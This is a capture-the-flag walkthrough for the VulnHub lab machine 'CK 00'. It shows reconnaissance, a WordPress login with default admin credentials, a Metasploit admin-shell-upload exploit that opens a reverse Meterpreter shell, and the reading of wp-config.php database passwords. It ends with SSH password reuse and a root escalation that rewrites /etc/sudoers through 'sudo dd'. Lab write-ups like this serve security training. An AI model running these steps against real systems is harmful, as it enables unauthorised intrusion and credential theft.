
# CK 00 - CTF

Available on VulnHub: https://www.vulnhub.com/entry/ck-00,444/


## IP Discovery

```
$ sudo netdiscover -r 192.168.1.0/16
```

```
Currently scanning: Finished!   |   Screen View: Unique Hosts

0 Captured ARP Req/Rep packets, from 0 hosts.   Total size: 0
_____________________________________________________________________________
 IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
xxx.xxx.x.x     xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
192.168.1.142   08:00:27:14:48:40      1      xx  PCS Systemtechnik GmbH
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

## Port Scanning

```
$ nmap -AT4 -p- 192.168.1.142
```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-12 15:40 EDT
Nmap scan report for 192.168.1.142
Host is up (0.0022s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d2:6f:64:b5:4c:22:ce:b2:c9:8a:ab:57:0e:69:4a:0f (RSA)
|   256 a8:6f:9c:0e:d2:ee:f8:73:0a:0f:5f:57:1c:2f:59:3a (ECDSA)
|_  256 10:8c:55:d4:79:7f:63:0f:ff:ea:c8:fb:73:1e:21:f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.2.2
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: CK~00 &#8211; Just another WordPress site
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.94 seconds
```

## Web Analysis

```
$ nikto -h http://192.168.1.142
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.142
+ Target Hostname:    192.168.1.142
+ Target Port:        80
+ Start Time:         2020-10-12 15:42:32 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'link' found, with contents: <http://ck/index.php/wp-json/>; rel="https://api.w.org/"
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Uncommon header 'x-redirect-by' found, with contents: WordPress
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /: A Wordpress installation was found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ OSVDB-3268: /wp-content/uploads/: Directory indexing found.
+ /wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information
+ /wp-login.php: Wordpress login found
+ 7915 requests: 0 error(s) and 16 item(s) reported on remote host
+ End Time:           2020-10-12 15:43:28 (GMT-4) (56 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```
$ dirb http://192.168.1.142

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Oct 12 15:42:16 2020
URL_BASE: http://192.168.1.142/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.142/ ----
+ http://192.168.1.142/index.php (CODE:301|SIZE:0)                                                                   
+ http://192.168.1.142/server-status (CODE:403|SIZE:301)                                                             
==> DIRECTORY: http://192.168.1.142/wp-admin/                                                                        
==> DIRECTORY: http://192.168.1.142/wp-content/                                                                      
==> DIRECTORY: http://192.168.1.142/wp-includes/                                                                     
+ http://192.168.1.142/xmlrpc.php (CODE:405|SIZE:42)                                                                 
                                                                                                                     
---- Entering directory: http://192.168.1.142/wp-admin/ ----
+ http://192.168.1.142/wp-admin/admin.php (CODE:302|SIZE:0)                                                          
==> DIRECTORY: http://192.168.1.142/wp-admin/css/                                                                    
==> DIRECTORY: http://192.168.1.142/wp-admin/images/                                                                 
==> DIRECTORY: http://192.168.1.142/wp-admin/includes/                                                               
+ http://192.168.1.142/wp-admin/index.php (CODE:302|SIZE:0)                                                          
==> DIRECTORY: http://192.168.1.142/wp-admin/js/                                                                     
==> DIRECTORY: http://192.168.1.142/wp-admin/maint/                                                                  
==> DIRECTORY: http://192.168.1.142/wp-admin/network/                                                                
==> DIRECTORY: http://192.168.1.142/wp-admin/user/                                                                   
                                                                                                                     
---- Entering directory: http://192.168.1.142/wp-content/ ----
+ http://192.168.1.142/wp-content/index.php (CODE:200|SIZE:0)                                                        
==> DIRECTORY: http://192.168.1.142/wp-content/plugins/                                                              
==> DIRECTORY: http://192.168.1.142/wp-content/themes/                                                               
==> DIRECTORY: http://192.168.1.142/wp-content/uploads/                                                              
                                                                                                                     
---- Entering directory: http://192.168.1.142/wp-includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.142/wp-admin/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.142/wp-admin/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.142/wp-admin/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.142/wp-admin/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.142/wp-admin/maint/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.142/wp-admin/network/ ----
+ http://192.168.1.142/wp-admin/network/admin.php (CODE:302|SIZE:0)                                                  
+ http://192.168.1.142/wp-admin/network/index.php (CODE:302|SIZE:0)                                                  
                                                                                                                     
---- Entering directory: http://192.168.1.142/wp-admin/user/ ----
+ http://192.168.1.142/wp-admin/user/admin.php (CODE:302|SIZE:0)                                                     
+ http://192.168.1.142/wp-admin/user/index.php (CODE:302|SIZE:0)                                                     
                                                                                                                     
---- Entering directory: http://192.168.1.142/wp-content/plugins/ ----
+ http://192.168.1.142/wp-content/plugins/index.php (CODE:200|SIZE:0)                                                
                                                                                                                     
---- Entering directory: http://192.168.1.142/wp-content/themes/ ----
+ http://192.168.1.142/wp-content/themes/index.php (CODE:200|SIZE:0)                                                 
                                                                                                                     
---- Entering directory: http://192.168.1.142/wp-content/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Mon Oct 12 15:42:33 2020
DOWNLOADED: 32284 - FOUND: 12
```

Update `/etc/hosts` with **ck** DNS
```
192.168.1.142 ck
```

WordPress Login Page: http://ck/wp-login.php

## WordPress Analysis

```
$ wpscan --url http://192.168.1.142
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.7
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://192.168.1.142/ [192.168.1.142]
[+] Started: Mon Oct 12 15:53:26 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.1.142/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://192.168.1.142/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.1.142/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.1.142/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.2.2 identified (Insecure, released on 2019-06-18).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.1.142/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.2.2'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.1.142/, Match: 'WordPress 5.2.2'

[i] The main theme could not be detected.

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:00 <=> (329 / 329) 100.00% Time: 00:00:00

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:03 <=> (2568 / 2568) 100.00% Time: 00:00:03

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=> (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:00 <=> (36 / 36) 100.00% Time: 00:00:00

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:01 <=> (100 / 100) 100.00% Time: 00:00:01

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Mon Oct 12 15:53:36 2020
[+] Requests Done: 3116
[+] Cached Requests: 4
[+] Data Sent: 779.525 KB
[+] Data Received: 15.851 MB
[+] Memory used: 234.473 MB
[+] Elapsed time: 00:00:10
```

User: **admin** \
Listable Directory: http://192.168.1.142/wp-content/uploads/

## WordPress Login

The default credentials were not changed.\
WordPress Credentials: **admin** : **admin**

## Exploitation

```
$ msfconsole

msf5 > use exploit/unix/webapp/wp_admin_shell_upload
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf5 exploit(unix/webapp/wp_admin_shell_upload) >

msf5 exploit(unix/webapp/wp_admin_shell_upload) > set RHOSTS 192.168.1.142
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME admin
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD admin

msf5 exploit(unix/webapp/wp_admin_shell_upload) > show options

Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   admin            yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.1.142    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME   admin            yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.116    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress
```

Running exploit
```
msf5 exploit(unix/webapp/wp_admin_shell_upload) > exploit

[*] Started reverse TCP handler on 192.168.1.116:4444 
[*] Authenticating with WordPress using admin:admin...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wp-content/plugins/PJtRXEtceL/iOaNJwkjPy.php...
[*] Sending stage (38288 bytes) to 192.168.1.142
[*] Meterpreter session 1 opened (192.168.1.116:4444 -> 192.168.1.142:36650) at 2020-10-12 17:21:40 -0400
[+] Deleted iOaNJwkjPy.php
[+] Deleted PJtRXEtceL.php
[+] Deleted ../PJtRXEtceL

meterpreter > sysinfo
Computer    : ck00
OS          : Linux ck00 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64
Meterpreter : php/linux
```

## Machine Users

```
www-data@ck00:/home/ck$ cat /etc/passwd | grep bash

root:x:0:0:root:/root:/bin/bash
ck-00:x:1000:1000:CyberKnight:/home/ck:/bin/bash
bla1:x:1001:1001:Bla 1,01,0000,0001:/home/bla1:/bin/bash
bla:x:1002:1002:bla,0000,0000,0000:/home/bla:/bin/bash
```

Users:
* root
* ck-00
* bla1
* bla

## Flag #1

```
meterpreter> shell

cat /home/ck/ck00-local-flag
local.txt = 8163d4c2c7ccb38591d57b86c7414f8c
```

## DataBase Info Acquiring

```
meterpreter > cat /var/www/html/wp-config.php

<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'ck_wp' );

/** MySQL database username */
define( 'DB_USER', 'root' );

/** MySQL database password */
define( 'DB_PASSWORD', 'bla_is_my_password' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'p#Q01YN<z$l{5^D&(haSU$vgD&b[p|)-Lur+Dg?~tatRgW>6gOVHVWx4w?oaucv.' );
define( 'SECURE_AUTH_KEY',  '<2GT}7Pq7VO_ck.B,/Le0kGQ@4^2FmV`ZX`AXLy%zoUXJE=:E^OT6Z$*ATfmR^+i' );
define( 'LOGGED_IN_KEY',    'tZF#d=KgHwwDH;xRiY)H;zT>weOD4;JgWF7KR)E,I_Sh#-B~Vbt!ax#<f@CSpykY' );
define( 'NONCE_KEY',        '8Odpqiy#/phCF6ezi?%gx0QEZWf ioBO,B}6h(TDkNBnrIjA`9.P6Jzn4+c<Z)D ' );
define( 'AUTH_SALT',        'kT0BrKy<fSR&[]HN]Pi{ +wa.@m~Xe)hGz2|LG#i*}v^upHn%B.^.swm q^rr%Bt' );
define( 'SECURE_AUTH_SALT', 'rV=Knc-+O}1Ee(v2T9P*{655sR-*aRW<NEc^lhd,IGBI<-0^=?cbq]#; |F||Ipi' );
define( 'LOGGED_IN_SALT',   '|,(6szua!E2iatwI)AvtOZ5KehK}2p@Z]F.i%~!l>wu)(8pw;FV@qC&$?q,nmf0z' );
define( 'NONCE_SALT',       'tqAZj9,df7;4?DKrB5+$=4bwiQBO?Fs_tGYmN`Fc y?,r}90rh/aB;tzaCWwv4vi' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', dirname( __FILE__ ) . '/' );
}

/** Sets up WordPress vars and included files. */
require_once( ABSPATH . 'wp-settings.php' );
```

DB_NAME: **ck_wp** \
DB_USER: **root** \
DB_PASSWORD: **bla_is_my_password** \
DB_HOST: **localhost**

## DataBase Access

MySQL connection
```
meterpreter> shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

www-data@ck00:/home/ck$ mysql -u root -h localhost -p
Enter password: bla_is_my_password

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 76
Server version: 5.7.31-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

Searching for users
```
mysql> show databases;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| ck_wp              |
| mysql              |
| performance_schema |
| sys                |
+--------------------+

mysql> show tables;

+-----------------------+
| Tables_in_ck_wp       |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+

mysql> SELECT user_login,user_pass FROM wp_users;

+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$B28STLnaOYujZ9GjgPnwI/Bo7gIJil. |
+------------+------------------------------------+
```

Unfortunately, only the admin user is registered.

## SSH Access

Attempting SSH login with DB credentials.
```
$ ssh root@192.168.1.142
root@192.168.1.142's password: bla_is_my_password
Permission denied, please try again.

$ ssh bla@192.168.1.142
bla@192.168.1.142's password: bla_is_my_password
Last login: Fri Aug  2 13:35:50 2019 from 192.168.29.253

bla@ck00:~$ id
uid=1002(bla) gid=1002(bla) groups=1002(bla)
```

Credentials: **bla**:**bla_is_my_password**

## Privilege Escalation to `bla1`

Attempt to login with `bla1` using `bla1_is_my_password`
```
$ ssh bla1@192.168.1.142
bla1@192.168.1.142's password: bla1_is_my_password
Last login: Fri Aug  2 13:23:25 2019 from 192.168.29.240

bla1@ck00:~$ id
uid=1001(bla1) gid=1001(bla1) groups=1001(bla1)
```

Credentials: **bla1**:**bla1_is_my_password**

## Privilege Escalation to `ck-00`

Apparently `bla1` is allow to run `/bin/rbash` as `ck-00`.
```
bla1@ck00:~$ sudo -l
Matching Defaults entries for bla1 on ck00:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bla1 may run the following commands on ck00:
    (ck-00) NOPASSWD: /bin/rbash
```

Running `/bin/rbash` as `ck-00`
```
bla1@ck00:~$ sudo -u ck-00 /bin/rbash
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

ck-00@ck00:~$ id
uid=1000(ck-00) gid=1000(ck-00) groups=1000(ck-00),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

## Privilege Escalation to Root

Apparently `ck-00` is allow to run `/bin/dd` as super user.
```
ck-00@ck00:~$ sudo -l
Matching Defaults entries for ck-00 on ck00:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ck-00 may run the following commands on ck00:
    (root) NOPASSWD: /bin/dd
```

Checking `/etc/sudoers` file
```
ck-00@ck00:~$ sudo dd if=/etc/sudoers

# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults	env_reset
Defaults	mail_badpass
Defaults	secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification
# User alias specification
# Cmnd alias specification

# User privilege specification
root	ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
#%sudo	ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
bla ALL=(bla1) /usr/bin/scp
bla1 ALL=(ck-00) NOPASSWD : /bin/rbash
ck-00 ALL=NOPASSWD:/bin/dd
```

Attempt to add a new allow all rule for `ck-00` ( ck-00 ALL=(ALL) NOPASSWD: ALL )
```
ck-00@ck00:~$ echo -e "$(sudo dd if=/etc/sudoers)\nck-00 ALL=(ALL) NOPASSWD: ALL" | sudo dd of=/etc/sudoers

0+0 records in
0+0 records out
0 bytes copied, 0.000804805 s, 0.0 kB/s
0+1 records in
0+1 records out
31 bytes copied, 0.00403871 s, 7.7 kB/s

ck-00@ck00:~$ sudo id
uid=0(root) gid=0(root) groups=0(root)

ck-00@ck00:~$ sudo su
root@ck00:~#
```

## Flag #2

```
root@ck00:~# cat /root/ck00-root-flag.txt

 ▄▄▄▄▄▄▄▄▄▄▄ ▄         ▄ ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄    ▄ ▄▄        ▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄         ▄ ▄▄▄▄▄▄▄▄▄▄▄        ▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄  
▐░░░░░░░░░░░▐░▌       ▐░▐░░░░░░░░░░▌▐░░░░░░░░░░░▐░░░░░░░░░░░▐░▌  ▐░▐░░▌      ▐░▐░░░░░░░░░░░▐░░░░░░░░░░░▐░▌       ▐░▐░░░░░░░░░░░▌      ▐░░░░░░░░░▌ ▐░░░░░░░░░▌ 
▐░█▀▀▀▀▀▀▀▀▀▐░▌       ▐░▐░█▀▀▀▀▀▀▀█░▐░█▀▀▀▀▀▀▀▀▀▐░█▀▀▀▀▀▀▀█░▐░▌ ▐░▌▐░▌░▌     ▐░▌▀▀▀▀█░█▀▀▀▀▐░█▀▀▀▀▀▀▀▀▀▐░▌       ▐░▌▀▀▀▀█░█▀▀▀▀      ▐░█░█▀▀▀▀▀█░▐░█░█▀▀▀▀▀█░▌
▐░▌         ▐░▌       ▐░▐░▌       ▐░▐░▌         ▐░▌       ▐░▐░▌▐░▌ ▐░▌▐░▌    ▐░▌    ▐░▌    ▐░▌         ▐░▌       ▐░▌    ▐░▌          ▐░▌▐░▌    ▐░▐░▌▐░▌    ▐░▌
▐░▌         ▐░█▄▄▄▄▄▄▄█░▐░█▄▄▄▄▄▄▄█░▐░█▄▄▄▄▄▄▄▄▄▐░█▄▄▄▄▄▄▄█░▐░▌░▌  ▐░▌ ▐░▌   ▐░▌    ▐░▌    ▐░▌ ▄▄▄▄▄▄▄▄▐░█▄▄▄▄▄▄▄█░▌    ▐░▌          ▐░▌ ▐░▌   ▐░▐░▌ ▐░▌   ▐░▌
▐░▌         ▐░░░░░░░░░░░▐░░░░░░░░░░▌▐░░░░░░░░░░░▐░░░░░░░░░░░▐░░▌   ▐░▌  ▐░▌  ▐░▌    ▐░▌    ▐░▌▐░░░░░░░░▐░░░░░░░░░░░▌    ▐░▌          ▐░▌  ▐░▌  ▐░▐░▌  ▐░▌  ▐░▌
▐░▌          ▀▀▀▀█░█▀▀▀▀▐░█▀▀▀▀▀▀▀█░▐░█▀▀▀▀▀▀▀▀▀▐░█▀▀▀▀█░█▀▀▐░▌░▌  ▐░▌   ▐░▌ ▐░▌    ▐░▌    ▐░▌ ▀▀▀▀▀▀█░▐░█▀▀▀▀▀▀▀█░▌    ▐░▌          ▐░▌   ▐░▌ ▐░▐░▌   ▐░▌ ▐░▌
▐░▌              ▐░▌    ▐░▌       ▐░▐░▌         ▐░▌     ▐░▌ ▐░▌▐░▌ ▐░▌    ▐░▌▐░▌    ▐░▌    ▐░▌       ▐░▐░▌       ▐░▌    ▐░▌          ▐░▌    ▐░▌▐░▐░▌    ▐░▌▐░▌
▐░█▄▄▄▄▄▄▄▄▄     ▐░▌    ▐░█▄▄▄▄▄▄▄█░▐░█▄▄▄▄▄▄▄▄▄▐░▌      ▐░▌▐░▌ ▐░▌▐░▌     ▐░▐░▌▄▄▄▄█░█▄▄▄▄▐░█▄▄▄▄▄▄▄█░▐░▌       ▐░▌    ▐░▌          ▐░█▄▄▄▄▄█░█░▐░█▄▄▄▄▄█░█░▌
▐░░░░░░░░░░░▌    ▐░▌    ▐░░░░░░░░░░▌▐░░░░░░░░░░░▐░▌       ▐░▐░▌  ▐░▐░▌      ▐░░▐░░░░░░░░░░░▐░░░░░░░░░░░▐░▌       ▐░▌    ▐░▌           ▐░░░░░░░░░▌ ▐░░░░░░░░░▌ 
 ▀▀▀▀▀▀▀▀▀▀▀      ▀      ▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ ▀         ▀ ▀    ▀ ▀        ▀▀ ▀▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀ ▀         ▀      ▀             ▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀  
                                                                                                                                   

flag = c0523985a2640ad30429fb2055196e4c

Thia flag is a proof that you get the root shell.
You have to submit your report contaning all steps you take to get root shell.
Send your report to our official mail : vishalbiswas420@gmail.com
```
